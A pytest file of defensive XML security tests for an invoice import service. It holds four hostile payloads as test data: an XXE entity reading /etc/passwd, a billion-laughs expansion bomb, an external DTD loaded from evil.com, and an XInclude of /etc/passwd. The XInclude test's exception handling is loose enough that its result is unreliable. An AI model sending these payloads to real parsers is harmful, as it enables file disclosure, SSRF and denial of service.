"""TDD Security tests — XML security — RED phase.

Tests for XXE, entity expansion, XInclude, SSRF via XML.
"""
import pytest

from apps.common.exceptions import XmlSecurityError


class TestXmlSecurity:
    def test_xxe_attack_blocked(self):
        """External entity injection is blocked by defusedxml."""
        from apps.sdi.services.xml_importer import InvoiceXmlImportService

        malicious = """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>"""

        with pytest.raises(XmlSecurityError):
            InvoiceXmlImportService().import_xml(malicious)

    def test_billion_laughs_blocked(self):
        """Billion laughs (entity expansion) is blocked."""
        from apps.sdi.services.xml_importer import InvoiceXmlImportService

        billion = """<?xml version="1.0"?>
        <!DOCTYPE lol [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <root>&lol4;</root>"""

        with pytest.raises(XmlSecurityError):
            InvoiceXmlImportService().import_xml(billion)

    def test_ssrf_via_xml_blocked(self):
        """SSRF via external DTD is blocked."""
        from apps.sdi.services.xml_importer import InvoiceXmlImportService

        ssrf = """<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://evil.com/malicious.dtd">
        <root>data</root>"""

        with pytest.raises(XmlSecurityError):
            InvoiceXmlImportService().import_xml(ssrf)

    def test_xinclude_blocked(self):
        """XInclude directive is not processed."""
        from apps.sdi.services.xml_importer import InvoiceXmlImportService

        xinclude = """<?xml version="1.0"?>
        <root xmlns:xi="http://www.w3.org/2001/XInclude">
          <xi:include href="/etc/passwd" parse="text"/>
        </root>"""

        # Should either raise or silently ignore XInclude
        with pytest.raises((XmlSecurityError, Exception)):
            service = InvoiceXmlImportService()
            result = service.import_xml(xinclude)
            # If no exception, XInclude content must NOT be present
            assert "/etc/passwd" not in str(result)
